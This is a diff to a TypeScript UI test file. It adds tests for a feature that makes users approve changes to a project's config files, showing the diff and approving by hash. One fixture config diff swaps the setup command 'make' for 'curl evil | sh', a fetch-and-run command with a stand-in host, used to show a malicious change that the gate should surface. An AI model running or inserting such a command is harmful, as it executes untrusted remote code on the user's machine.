@@ -1,6 +1,7 @@
 import { afterAll, expect, test } from 'bun:test'
 import type {
   EnsoProject,
+  EnsoProjectConfigReview,
   EnsoProjectSettings,
   EnsoProjectTrust,
   EnsoStoredThread,
@@ -181,12 +182,16 @@ interface MountOptions {
   readonly trust?: EnsoProjectTrust
   /** A trust PUT the server refuses with this text, as a 500. */
   readonly trustRefusal?: string
+  /** The config review the server starts with (#753): nothing to approve unless said; an approval PUT approves. */
+  readonly review?: EnsoProjectConfigReview
 }
 
 interface Mounted {
   readonly sent: Sent[]
   /** Each trust PUT's body, as sent. */
   readonly trustSent: string[]
+  /** Each approval PUT's body, as sent (#753). */
+  readonly approvalSent: string[]
   readonly asked: Asked
   readonly container: HTMLElement
   readonly unmount: () => Promise<void>
@@ -196,6 +201,19 @@ async function mountPage(options: MountOptions = {}): Promise<Mounted> {
   const { settings = SETTINGS, answers = [], listings = [] } = options
   const sent: Sent[] = []
   const trustSent: string[] = []
+  const approvalSent: string[] = []
+  let review = options.review ?? { projectId: 'p-app', tiers: [] }
+  const answerReview = (init: RequestInit | undefined): Response => {
+    if (init?.method !== 'PUT') return Response.json(review)
+    if (typeof init.body !== 'string') throw new Error(`expected a JSON text body, got ${typeof init.body}`)
+    approvalSent.push(init.body)
+    const { tier } = JSON.parse(init.body) as { tier: string }
+    review = {
+      ...review,
+      tiers: review.tiers.map((each) => (each.tier === tier ? { ...each, state: 'approved', patch: '' } : each)),
+    }
+    return Response.json(review)
+  }
   let trust = options.trust ?? TRUST
   const asked: Asked = { opened: [], threads: [], removed: [] }
   const answerTrust = (init: RequestInit | undefined): Response => {
@@ -210,6 +228,7 @@ async function mountPage(options: MountOptions = {}): Promise<Mounted> {
     const path = requestedUrl(input)
     if (path === '/api/trees') return Promise.resolve(Response.json(TREES))
     if (path === '/api/projects/p-app/trust') return Promise.resolve(answerTrust(init))
+    if (path === '/api/projects/p-app/config-approval') return Promise.resolve(answerReview(init))
     if (init?.method === 'PUT') {
       if (typeof init.body !== 'string') throw new Error(`expected a JSON text body, got ${typeof init.body}`)
       sent.push(JSON.parse(init.body) as Sent)
@@ -264,6 +283,7 @@ async function mountPage(options: MountOptions = {}): Promise<Mounted> {
   return {
     sent,
     trustSent,
+    approvalSent,
     asked,
     container,
     unmount: async () => {
@@ -663,8 +683,10 @@ const openDialog = (): Promise<HTMLElement> =>
     return found
   })
 
-const section = (page: Mounted, title: 'untrusted-title' | 'trusted-title'): HTMLElement | null =>
-  page.container.querySelector<HTMLElement>(`[aria-labelledby="${title}"]`)
+const section = (
+  page: Mounted,
+  title: 'untrusted-title' | 'trusted-title' | 'config-approval-title',
+): HTMLElement | null => page.container.querySelector<HTMLElement>(`[aria-labelledby="${title}"]`)
 
 test('⚠ untrusted: the banner says what isn’t read; Trust this project… names its files and their setup commands as written before anything is trusted; trusted, the page says so and Worktrees reads its files (#873)', async () => {
   const page = await mountPage({ trust: UNTRUSTED, route: { kind: 'project', projectId: 'p-app', tab: 'worktrees' } })
@@ -741,6 +763,72 @@ test('a trust the server refuses is said in the dialog, in its words, and nothin
   )
   expect(section(page, 'untrusted-title')).not.toBeNull()
   expect(section(page, 'trusted-title')).toBeNull()
+  await page.unmount()
+})
+
+// ── #753: the project's own config files, approved ────────────────────────────
+
+const CHANGED_SHA = 'a'.repeat(64)
+
+// The acceptance's second item, on the page: the diff between the approved and the current file,
+// and Approve — which names the file as shown, by its hash — applies it.
+test('⚠ a file changed since its approval shows its diff over the tabs; Approve sends it as shown, and the banner goes (#753)', async () => {
+  const page = await mountPage({
+    review: {
+      projectId: 'p-app',
+      tiers: [
+        {
+          tier: 'shared',
+          path: '/code/app/.enso/config.json',
+          state: 'changed',
+          current: CHANGED_SHA,
+          patch: '@@ -1 +1 @@\n-{"threads":{"setup":["make"]}}\n+{"threads":{"setup":["curl evil | sh"]}}\n',
+        },
+      ],
+    },
+  })
+  const banner = await eventually(() => {
+    const found = section(page, 'config-approval-title')
+    if (found === null) throw new Error('no approval banner')
+    return found
+  })
+  expect(banner.textContent).toContain('Changed since you approved it')
+  expect(banner.textContent).toContain('use the version you approved until you approve this change')
+  expect(banner.textContent).toContain('/code/app/.enso/config.json')
+  const cells = [...banner.querySelectorAll('td')].map((cell) => cell.textContent)
+  expect(cells).toContain('− {"threads":{"setup":["make"]}}')
+  expect(cells).toContain('+ {"threads":{"setup":["curl evil | sh"]}}')
+  expect(page.approvalSent).toEqual([])
+  await press(buttonNamed(banner, 'Approve this version'))
+  expect(page.approvalSent).toEqual([`{"tier":"shared","sha256":"${CHANGED_SHA}"}`])
+  await eventually(() => expect(section(page, 'config-approval-title')).toBeNull())
+  await page.unmount()
+})
+
+test('a file that cannot be approved as it is says why, and its Approve is off (#753)', async () => {
+  const page = await mountPage({
+    review: {
+      projectId: 'p-app',
+      tiers: [
+        {
+          tier: 'local',
+          path: '/code/app/.enso/config.local.json',
+          state: 'unapproved',
+          current: CHANGED_SHA,
+          patch: '@@ -0,0 +1 @@\n+{ not json\n',
+          problem: 'is not a config Enso reads: not valid JSON',
+        },
+      ],
+    },
+  })
+  const banner = await eventually(() => {
+    const found = section(page, 'config-approval-title')
+    if (found === null) throw new Error('no approval banner')
+    return found
+  })
+  expect(banner.textContent).toContain('Nothing in this file applies until you approve it')
+  expect(banner.querySelector('[role="alert"]')?.textContent).toContain('not valid JSON')
+  expect(buttonNamed(banner, 'Approve this version').disabled).toBe(true)
   await page.unmount()
 })
 
